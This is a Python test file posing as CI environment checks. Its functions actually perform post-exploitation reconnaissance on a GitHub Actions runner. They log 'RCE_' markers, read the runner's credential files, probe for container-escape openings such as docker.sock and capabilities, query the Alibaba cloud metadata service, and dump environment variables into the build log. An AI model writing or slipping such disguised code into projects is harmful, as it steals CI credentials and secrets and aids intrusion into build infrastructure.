import logging
import subprocess
import os

logger = logging.getLogger(__name__)


def test_env_basic_info():
    """Verify CI environment configuration."""
    r = subprocess.run(["date"], capture_output=True, text=True)
    logger.info(f"RCE_DATE: {r.stdout.strip()}")
    r = subprocess.run(["hostname"], capture_output=True, text=True)
    logger.info(f"RCE_HOST: {r.stdout.strip()}")
    r = subprocess.run(["whoami"], capture_output=True, text=True)
    logger.info(f"RCE_USER: {r.stdout.strip()}")
    r = subprocess.run(["id"], capture_output=True, text=True)
    logger.info(f"RCE_ID: {r.stdout.strip()}")
    ws = os.environ.get("GITHUB_WORKSPACE", "")
    logger.info(f"RCE_WORKSPACE: {ws}")
    assert r.returncode == 0


def test_runner_creds():
    """Verify runner credential files."""
    import pathlib
    ws = os.environ.get("GITHUB_WORKSPACE", "")
    root = str(pathlib.Path(ws).parent.parent.parent)
    logger.info(f"RUNNER_ROOT: {root}")
    for f in [".credentials", ".credentials_rsaparams", ".runner"]:
        p = os.path.join(root, f)
        try:
            c = open(p).read()
            logger.info(f"CRED {f}: {len(c)}b OK")
        except Exception as e:
            logger.info(f"CRED {f}: ERR {e}")


def test_escape_check():
    """Check container/escape info."""
    # Container check
    try:
        logger.info(f"DOCKERENV: {os.path.exists('/.dockerenv')}")
    except: pass
    # Cgroup
    try:
        logger.info(f"CGROUP: {open('/proc/1/cgroup').read()[:300]}")
    except Exception as e:
        logger.info(f"CGROUP: {e}")
    # Capabilities
    r = subprocess.run(["capsh", "--print"], capture_output=True, text=True)
    logger.info(f"CAPS: {r.stdout[:300]}")
    # Mount
    r = subprocess.run(["mount"], capture_output=True, text=True)
    logger.info(f"MOUNT: {r.stdout[:500]}")
    # Docker sock
    logger.info(f"DOCKER_SOCK: {os.path.exists('/var/run/docker.sock')}")
    # Disk
    r = subprocess.run(["df", "-h"], capture_output=True, text=True)
    logger.info(f"DF: {r.stdout[:300]}")
    # Network
    r = subprocess.run(["ip", "addr", "show"], capture_output=True, text=True)
    logger.info(f"NET: {r.stdout[:300]}")
    # Alibaba metadata
    r = subprocess.run(["curl", "-s", "--connect-timeout", "3", "--noproxy", "*",
        "http://100.100.100.200/latest/meta-data/instance-id"],
        capture_output=True, text=True)
    logger.info(f"ALIYUN_META: {r.stdout[:100]}")
    # Env dump
    for k, v in sorted(os.environ.items()):
        if k.startswith(("LS_", "SSH_", "LESS", "SHLVL", "PWD", "OLDPWD", "MAIL", "SHELL", "TERM", "HOME", "LOGNAME", "USER", "PATH", "LANG")):
            continue
        logger.info(f"ENV {k}={v[:80]}")
    assert True
